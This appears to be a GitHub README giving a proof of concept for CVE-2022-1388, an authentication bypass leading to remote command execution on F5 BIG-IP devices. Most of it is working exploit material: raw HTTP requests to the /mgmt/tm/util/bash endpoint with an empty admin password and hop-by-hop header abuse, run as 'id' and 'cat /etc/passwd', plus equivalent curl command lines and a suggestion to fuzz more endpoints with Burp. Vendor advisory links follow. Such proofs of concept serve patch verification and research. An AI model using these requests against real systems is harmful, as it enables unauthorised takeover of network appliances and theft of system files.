
# F5 BIG-IP RCE exploitation (CVE-2022-1388)

<p align="center">
<img src="https://user-images.githubusercontent.com/3140111/167378663-f1387d6d-dc49-431d-8550-cd8d5a993c66.png">
</p>

POST (1): 
![poc_id](https://user-images.githubusercontent.com/3140111/167375637-54878b95-0897-4ae6-92e0-60ab4cac5c62.png)
```ruby
POST /mgmt/tm/util/bash HTTP/1.1
Host: <redacted>:8443
Authorization: Basic YWRtaW46
Connection: keep-alive, X-F5-Auth-Token
X-F5-Auth-Token: 0

{"command": "run" , "utilCmdArgs": " -c 'id' " }

```
curl commandliner: 
```ruby
$ curl -i -s -k -X $'POST'
-H $'Host: <redacted>:8443' 
-H $'Authorization: Basic YWRtaW46' 
-H $'Connection: keep-alive, X-F5-Auth-Token' 
-H $'X-F5-Auth-Token: 0' 
-H $'Content-Length: 52' 
--data-binary $'{\"command\": \"run\" , \"utilCmdArgs\": \" -c \'id\' \" }\x0d\x0a'
$'https://<redacted>:8443/mgmt/tm/util/bash' --proxy http://127.0.0.1:8080
```
POST (2):
![poc_pass](https://user-images.githubusercontent.com/3140111/167375725-2a5403c1-f99a-427a-b99a-a18bc8f7f54c.png)
```ruby
POST /mgmt/tm/util/bash HTTP/1.1
Host: <redateced>:8443
Authorization: Basic YWRtaW46
Connection: keep-alive, X-F5-Auth-Token
X-F5-Auth-Token: 0

{"command": "run" , "utilCmdArgs": " -c ' cat /etc/passwd' " }

```
curl commandliner:
```ruby
$ curl -i -s -k -X $'POST'
-H $'Host: <redacted>:8443' 
-H $'Authorization: Basic YWRtaW46' -H $'Connection: keep-alive, X-F5-Auth-Token' 
-H $'X-F5-Auth-Token: 0'
--data-binary $'{\"command\": \"run\" , \"utilCmdArgs\": \" -c \' cat /etc/passwd\' \" }\x0d\x0a\x0d\x0a'
$'https://<redacted>/mgmt/tm/util/bash' --proxy http://127.0.0.1:8080
``` 
Note: 
```
Issue could be related between frontend and backend authentication "Jetty" with empty credentials "admin: <empty>" 
+ value of headers ,see "HTTP hop_by_hop request headers"...
```
My BIG-IP now fixed: 

![image](https://user-images.githubusercontent.com/3140111/167377761-91e37bd9-9461-4914-97ee-6e8e6366611b.png)

References and Fixes : </br>
* https://support.f5.com/csp/article/K23605346<br>
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388

Here the documentation used latest nites:
* https://clouddocs.f5.com/api/icontrol-rest/ 

HTTP hop_by_hop request headers: 
* https://portswigger.net/research/top-10-web-hacking-techniques-of-2019-nominations-open

F5 iControl REST Endpoint Authentication Bypass Technical Deep Dive by horizon3
* https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/

My notes:
* Updated with my icontrol endpoints and commands list used on my research (extracted from public documentation)
* Could use Burp with "cluster  bomb" or "Battering ram" (simple list) e.g 

**Payload1**: icontrol_api_endpoints.txt <br/>
**Payload2**: icontrol_api_commands.txt <br/>


# Author
Alex Hernandez aka <em><a href="https://twitter.com/_alt3kx_" rel="nofollow">(@\_alt3kx\_)</a></em>




